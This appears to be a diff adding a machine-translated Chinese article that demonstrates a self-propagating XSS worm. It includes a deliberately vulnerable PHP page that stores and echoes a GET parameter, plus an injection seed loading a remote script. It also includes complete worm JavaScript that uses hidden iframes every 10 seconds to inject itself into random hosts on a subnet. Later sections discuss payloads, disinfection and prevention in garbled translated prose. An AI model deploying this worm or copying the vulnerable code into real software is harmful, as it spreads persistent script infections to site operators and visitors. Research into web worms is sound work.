@@ -1,0 +1,110 @@
+跨站(xss)脚本病毒编写详解 (HaCkXi译文)2009-02-23 08:55下面的概念证明表明了XSS病毒。脆弱的环境造成就是一个例子情景的XSS所需的病毒，并不表明详尽的一套可能的条件。这说明在长期的XSS一个web应用。在这种情况下，漏洞是通过利用获得的请求，这使得小病毒将创建。
+
+最初的一个实例脆弱的web应用将种子与自我传播的代码。当此代码是由网页浏览器，它的结果在他们的感染。被感染的网页浏览器连接到随机地点和执行利用获得的要求。注入代码，从而进一步易受感染的Web应用与自我繁殖的代码。
+
+下面制作的永久性的XSS利用PHP页面可以感染病毒。该网页接受一个参数（参数）值，并写入到一个文件（ file.txt ） 。这个档案，然后返回请求的浏览器。该文件将包含以前的值的“参数”参数。如果没有参数是通过它会显示该文件没有更新。
+
+Web应用程序：index.php
+
+QUOTE:<?php 
+   $p=$HTTP_GET_VARS['param']; 
+   $filename = "./file.txt"; 
+
+   if ($p != "") { 
+$handle=fopen($filename, "wb"); 
+fputs($handle, $p); 
+fclose($handle); 
+   } 
+
+   $handle = fopen($filename, "r"); 
+   $contents = fread($handle, filesize($filename)); 
+   fclose($handle); 
+
+   print $contents; 
+?>
+
+此网页的index.php 主办的多个虚拟服务器在10.0.0.0/24子网。一个网络应用实例种子，然后用以下代码检索javascript文件并执行它。另外，有可能注入到整个代码的脆弱的应用，而不是要求javascript文件。为了简洁明了， JavaScript文件(xssv.jsp)要求。
+
+注入种子编号：
+
+QUOTE:<iframe name="iframex" id="iframex" src="hidden" style="display:none"> 
+</iframe> 
+<script SRC="http://<webserver>/xssv.js"></script>
+
+在javascript文件所要求的例子如下所示。其自我用途繁殖的iframe是定期重新使用loadIframe ()函数。目标网站的IP地址的iframe是随机挑选的10.0.0.0/24子网的功能通过get_random_ip()。该病毒使用的XSS相结合的这两项职能，并不断定期调用使用setInterval()函数。
+
+Javascipt ： xssv.jsp
+
+QUOTE:function loadIframe(iframeName, url) { 
+   if ( window.frames[iframeName] ) { 
+window.frames[iframeName].location = url; 
+return false; 
+   } 
+   else return true; 
+} 
+
+function do_request() { 
+   var ip = get_random_ip(); 
+   var exploit_string = '<iframe name="iframe2" id="iframe2" ' + 
+'src="hidden" style="display:none"></iframe> ' + 
+'<script SRC="http://<webserver>/xssv.js"></script>'; 
+
+   loadIframe('iframe2', 
+"http://" + ip + "/index.php?param=" + exploit_string); 
+} 
+
+function get_random() 
+{ 
+   var ranNum= Math.round(Math.random()*255); 
+   return ranNum; 
+} 
+
+function get_random_ip() 
+{ 
+   return "10.0.0."+get_random(); 
+} 
+
+setInterval("do_request()", 10000);
+
+看种子Web应用的浏览器造成感染其他网络应用的10.0.0.0/24子网。这种感染，一直持续到一些，但并非所有的应用受到感染。在这一点上的浏览器是手动停止。另一个浏览器，然后用来查看一个新感染的Web应用。该病毒然后继续感染，其余未web应用程序的子网内。
+
+这个概念证明表明，控制的条件下，没有什么不同，以一个真实的世界环境中，跨站脚本病毒可以自我繁殖和传染。
+
+常规病毒分歧
+
+常规病毒和执行居住在同一系统上。单独的XSS病毒的这两个要求的一种共生关系，服务器和浏览器。执行发生在客户端浏览器的代码，并驻留在服务器上。
+
+纲要indiscrimination还分成一的XSS病毒从传统的对应。这是因为封装在HTML和HTTP / HTTPS协议。这些标准是支持大部分网络浏览器上运行不同的操作系统，使得跨站点脚本病毒平台独立。这个平台的独立性增加了一些潜在的网络应用，可感染。 
+感染
+
+跨站点脚本病毒感染发生在两个阶段，通常至少有两个设备。因此，有两种感染工作共生。
+
+服务器感染了持续自我传播的代码，它没有执行。第二阶段是浏览器的感染。注入代码加载从网站到非持久性的网络浏览器和处决。执行然后寻求新的服务器/网页加以利用并有可能执行它的有效载荷。通常情况下，将有一个受感染的服务器，许多受感染的浏览器。 
+有效载荷
+
+常规病毒一样，病毒的XSS能够提供有效载荷。该有效载荷将被处死的浏览器，并有限制的HTML兼容的代码。也就是说，有效载荷可以执行的HTML功能，包括了JavaScript 。
+
+虽然这并不构成限制，跨站脚本病毒仍然能够恶意活动。例如，可以有效载荷提供DDOS攻击，显示垃圾邮件或包含浏览器的漏洞。未来的载荷能力很可能是更大的原因越来越多的浏览器老练。 
+消毒
+
+之间的关系，服务器和一个浏览器可以被打破，只需关闭浏览器。但是，目前还没有手段来防止浏览器再次感染以外的其他禁用浏览器的功能。
+
+潜在的消毒方法将涉及引荐外地的请求标头。这是由于这一事实，即引荐很可能是登录网络服务器那里感染了尝试。因此，如果引荐欺骗并没有发生后，日志文件将揭示线索回到来源的病毒。
+
+预防
+
+一个共同的初期，以预防病毒感染是一个网络级防火墙。正如的HTTP / HTTPS协议是提供不受限制地通过共同的防火墙配置，这些防火墙障碍是无效的。一个潜在的补救措施，这是一个应用防火墙适当的XSS病毒签名。虽然不太可能，最明显的方式，以防止病毒的XSS是消除了XSS漏洞的Web应用。
+
+结论
+
+传染病性质的XSS病毒已被证明在一个受控环境。它是通过故意制作脆弱的网络应用程序分布在子网。这个环境，后来受到感染。
+
+的XSS病毒是一种新的物种。他们区分自己从他们的表兄弟通过常规的要求一台服务器的客户共生的关系和它们的平台独立性。这些差异产生积极和消极影响，毒的感染。
+
+本文说明了XSS病毒是平台独立的，并能进行恶意的职能。虽然有减缓的因素，这些问题再加上日益复杂的网络浏览器显示的XSS威胁的病毒。主动必须采取措施，以打击这一威胁，病毒之前的XSS成为流行病。
+
+                                                                 翻译者: HaCkXi 
+                                                           Blog: www.hackxi.cn
+                                                                 提供者:ShadowHider
+                                                           Blog: http://hi.baidu.com/zrxc
+ 
